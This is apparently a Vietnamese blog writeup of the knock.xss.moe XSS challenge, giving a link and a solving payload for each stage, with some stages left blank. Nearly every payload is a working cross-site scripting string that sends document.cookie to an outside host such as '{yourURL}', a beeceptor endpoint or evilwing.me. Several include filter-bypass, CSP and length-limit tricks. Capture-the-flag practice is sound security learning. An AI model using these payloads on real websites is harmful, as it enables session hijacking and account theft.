---
title: "[knock.xss.moe] XSS CHALLENGE"
date: 2019-01-06T18:04:50+07:00
draft: false
slug: KNOCK-XSS
tags: [XSS,knock.xss.moe,writeup]
---

---
>**XSS**:<br>
>Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người sử dụng web. Bất kì một website nào cho phép người sử dụng đăng thông tin mà không có sự kiểm tra chặt chẽ các đoạn mã nguy hiểm thì đều có thể tiềm ẩn các lỗi XSS.

>- **Link Challage**: [https://knock.xss.moe](https://knock.xss.moe)
>- **Rule**: Send link to bot and get cookie!!! 
>- **Link Request** : `xxxxx.knock.xss.moe/?q=payload`
>- **Thanks for** : [https://www.youtube.com/watch?v=rpHhM2X5jd8](https://www.youtube.com/watch?v=rpHhM2X5jd8)

---
# Stage1[Tutorial]
- Link : [http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/](http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/)
- Payload : `location=%22http://example.com/?%22%2Bdocument.cookie`

---
# Stage2
- Link : [http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=XSS](http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=XSS)
- Payload : `<script>location='{yourURL}/?se='%2Bdocument.cookie</script>`

---
# Stage3
- Link : [http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=XSS](http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=XSS)
- Payload : `"><script>location='{yourURL}/?se='%2Bdocument.cookie</script>`

---
# Stage4
- Link : [http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q=XSS](http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q=XSS)
- Payload : `'"></a><script>location='{yourURL}/?se='%2Bdocument.cookie</script>`

---
# Stage5
- Link : [http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=XSS](http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=XSS)
- Payload : `</textarea><script>location='{yourURL}/?se='%2Bdocument.cookie</script>`

---
# Stage6
- Link : [http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=XSS](http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=XSS)
- Payload : `</xmp><script>location='{yourURL}/?se='%2Bdocument.cookie</script>`

---
# Stage7
- Link : [http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS](http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS)
- Payload : ``XSS" onfocus="location=`yourURL/?se=${document.cookie}`" autofocus="``

---
# Stage8
- Link : [http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=XSS](http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=XSS)
- Payload : `"XSS' onfocus=location="{yourURL}/?se="%2Bdocument.cookie autofocus='"`

---
# Stage9
- Link : [http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS](http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS)
- Payload : `XSS" onfocus=location="{yourURL}/?se=".concat(document.cookie) autofocus"`

---
# Stage10
- Link : [http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=XSS](http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=XSS)
- Payload : `javascript:location="{yourURL}/?se=".concat(document.cookie)`

---
# Stage11
- Link : [http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=XSS](http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=XSS)
- Payload : `javascript:top.location="{yourURL}/?se=".concat(document.cookie)`

---
# Stage12
- Link : 
- Payload : 

---
# Stage20 
- Link : [http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=XSS](http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=XSS)
- Payload : `<scripscriptt>location='{yourURL}/?se='.concat(document.cookie)</scripscriptt>`
- Note : bypass script

---
# Stage21 
- Link : [http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=xss](http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=xss)
- Payload : `<scripT>javascript:location='{yourURL}/?se='.concat(document.cookie)</scripT>`
- Note : `Content-Security-Policy: script-src 'self' 'unsafe-inline'`

---
# Stage22
- Link : [http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/](http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/)
- Payload : `<script>eval(location.hash.slice(1))</script>#location='{yourURL}/?se='+document.cookie`
- Note : Limit 65 character in script tag 🍌 
- Different way: Using shorten link your host, In your host:

```javascript
    <script>
        window.name = "location.href='http://evilwing.me:5000/?'+document.cookie";
        location.href = "http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=%3Csvg/onload=eval(name)%3E";
    </script>
```
---
# Stage23 
- Link : [http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=XSS](http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=XSS)
- Payload : `<script>eval(location.hash.slice(1))</script>#location='{yourURL}/?se='+document.cookie`
- Note : Limit 55 character 🍌 

---
# Stage24 
- Link : [http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/](http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/)
- Payload : `<script>eval(location.hash.slice(1))</script>#location='{yourURL}/?se='+document.cookie`
- Note : Limit 45 character  🍌 

---
# Stage25 
- Link : [http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/](http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/)
- Payload : ``
- Note : Limit 35 character input 🌶🌶 
- Thanks for : `https://daoduythuan.github.io/knock-xss-moe/`

---
# Stage26
- Link : [http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/](http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/)
- Pre-Pre-Payload : `<svg onload=location="https://xss12.free.beeceptor.com/?se=".concat(document.cookie)`
- Payload : Pre-Pre-Payload --HTMLCHARACTER--> Pre-Payload --URLENCODE--> PAYLOAD

---
# Stage27
- Link : [http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/](http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/)
- 💀 So Hard , TIME TO THINKING






